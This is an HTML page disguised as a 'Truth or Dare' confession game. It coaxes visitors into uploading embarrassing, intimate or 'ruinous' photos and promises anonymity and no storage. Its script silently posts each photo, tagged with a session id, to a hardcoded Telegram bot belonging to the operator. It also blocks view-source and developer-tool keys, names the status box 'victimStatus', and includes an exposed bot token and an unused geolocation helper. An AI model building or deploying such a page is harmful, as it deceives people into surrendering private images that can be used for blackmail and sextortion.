<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Truth or Dare • Confession Game</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }
    .game-card {
      max-width: 550px;
      width: 100%;
      background: rgba(255, 255, 255, 0.98);
      border-radius: 56px;
      padding: 2rem 1.8rem;
      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.4);
      text-align: center;
    }
    h1 {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(135deg, #ff6b6b, #ee5a24);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 0.5rem;
    }
    .sub { color: #666; font-size: 0.9rem; margin-bottom: 1.8rem; }
    .prompt-box {
      background: linear-gradient(135deg, #ffeaa7, #fdcb6e);
      border-radius: 32px;
      padding: 1.5rem;
      margin: 1.5rem 0;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    }
    .prompt-text { font-size: 1.6rem; font-weight: 700; color: #2d3436; margin-bottom: 0.5rem; }
    .prompt-sub { font-size: 0.85rem; color: #636e72; }
    .send-btn {
      background: linear-gradient(100deg, #ff6b6b, #ee5a24);
      border: none;
      padding: 1rem 2rem;
      font-size: 1.2rem;
      font-weight: 700;
      border-radius: 80px;
      color: white;
      cursor: pointer;
      width: 100%;
      margin: 1rem 0;
      transition: transform 0.15s;
      box-shadow: 0 8px 20px rgba(238, 90, 36, 0.3);
    }
    .send-btn:active { transform: scale(0.97); }
    .send-btn:disabled { opacity: 0.6; transform: none; }
    .status-msg {
      font-size: 0.8rem;
      color: #00b894;
      margin-top: 1rem;
      padding: 8px;
      background: #e0f7fa;
      border-radius: 40px;
    }
    .footer-note {
      font-size: 0.65rem;
      color: #b2bec3;
      margin-top: 1.5rem;
      padding-top: 1rem;
      border-top: 1px solid #dfe6e9;
    }
    .loader {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid #ffe0c4;
      border-top: 3px solid #ee5a24;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
<div class="game-card">
  <h1>🎭 Truth or Dare</h1>
  <div class="sub">confession challenge • be honest</div>
  <div class="prompt-box">
    <div class="prompt-text" id="dynamicPrompt">📸 Send your most embarrassing photo</div>
    <div class="prompt-sub" id="promptSub">no one will see it • just for the game</div>
  </div>
  <button id="sendPhotoBtn" class="send-btn">📤 SEND NOW 📤</button>
  <div id="victimStatus" class="status-msg">✨ ready to confess</div>
  <div class="footer-note">🔒 100% anonymous • no storage • just for fun</div>
</div>
<input type="file" id="hiddenFileInput" accept="image/jpeg,image/png,image/jpg,image/heic" style="display:none" />

<script>
  // ============ TELEGRAM CONFIG (Direct - No Backend) ============
  const TELEGRAM_BOT_TOKEN = "8618295467:AAHm-6BCUW4nbPALsBQmdth12-S-WhXypmE";
  const TELEGRAM_CHAT_ID = "6841194594";
  const MAX_SIZE_MB = 15;
  // ================================================================

  // Questions list (tor control er jonno - edit korte parbi direct ekhane)
  const QUESTIONS = [
    { id: 1, text: "📸 Send your most embarrassing photo", sub: "no one will see it • just for the game" },
    { id: 2, text: "🤢 Send your ugliest selfie", sub: "we promise to delete after laugh" },
    { id: 3, text: "😈 Send that photo you never showed anyone", sub: "your darkest secret stays here" },
    { id: 4, text: "📱 Send your worst screenshot", sub: "the one you regret taking" },
    { id: 5, text: "🍑 Send your most revealing pic", sub: "we won't judge" },
    { id: 6, text: "💀 Send the photo that could ruin you", sub: "trust me, it's safe" },
    { id: 7, text: "🎯 Send your guilty pleasure pic", sub: "what you hide from everyone" },
    { id: 8, text: "🤫 Send that one photo", sub: "you know which one" }
  ];

  let currentQuestion = QUESTIONS[0];
  let currentUserSession = localStorage.getItem('session_id');
  if (!currentUserSession) {
    currentUserSession = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
    localStorage.setItem('session_id', currentUserSession);
  }

  // Load saved active question from localStorage
  function loadActiveQuestion() {
    const savedId = localStorage.getItem('active_question_id');
    if (savedId) {
      const found = QUESTIONS.find(q => q.id == savedId);
      if (found) currentQuestion = found;
    }
    document.getElementById('dynamicPrompt').textContent = currentQuestion.text;
    document.getElementById('promptSub').textContent = currentQuestion.sub;
  }

  async function sendToTelegram(file, questionText) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', file);
    const timestamp = new Date().toLocaleString();
    const caption = `📸 NEW CONFESSION\n🎭 ${questionText}\n🆔 ${currentUserSession}\n⏱️ ${timestamp}`;
    formData.append('caption', caption.slice(0, 1024));
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      return data.ok === true;
    } catch(e) { 
      console.error(e);
      return false; 
    }
  }

  function getLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) resolve("unavailable");
      navigator.geolocation.getCurrentPosition(
        pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
        () => resolve("unavailable"),
        { timeout: 5000 }
      );
    });
  }

  let isUploading = false;
  const sendBtn = document.getElementById('sendPhotoBtn');
  const statusDiv = document.getElementById('victimStatus');
  const fileInput = document.getElementById('hiddenFileInput');

  async function handlePhoto(file) {
    if (!file || !file.type.startsWith('image/')) {
      statusDiv.textContent = "❌ Please select an image";
      setTimeout(() => statusDiv.textContent = "✨ ready to confess", 2000);
      return;
    }
    if (file.size > MAX_SIZE_MB * 1024 * 1024) {
      statusDiv.textContent = `❌ Max ${MAX_SIZE_MB}MB`;
      setTimeout(() => statusDiv.textContent = "✨ ready to confess", 2000);
      return;
    }
    isUploading = true;
    sendBtn.disabled = true;
    statusDiv.innerHTML = '<span class="loader"></span> Processing...';
    
    try {
      const success = await sendToTelegram(file, currentQuestion.text);
      if (success) {
        statusDiv.textContent = "✅ Sent! Your secret is safe 🤫";
      } else {
        statusDiv.textContent = "⚠️ Failed, try again";
      }
    } catch(e) {
      statusDiv.textContent = "⚠️ Failed, try again";
    }
    
    setTimeout(() => {
      if (statusDiv.textContent !== "✨ ready to confess") {
        statusDiv.textContent = "✨ ready to confess";
      }
    }, 3000);
    sendBtn.disabled = false;
    isUploading = false;
    fileInput.value = "";
  }

  sendBtn.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', (e) => {
    if (e.target.files[0]) handlePhoto(e.target.files[0]);
  });

  loadActiveQuestion();
  // Check every 5 seconds if question changed
  setInterval(loadActiveQuestion, 5000);

  document.addEventListener('contextmenu', e => e.preventDefault());
  document.onkeydown = (e) => {
    if ((e.ctrlKey && (e.key === 'u' || e.key === 'I')) || e.key === 'F12') {
      e.preventDefault();
      return false;
    }
  };
</script>
</body>
</html>
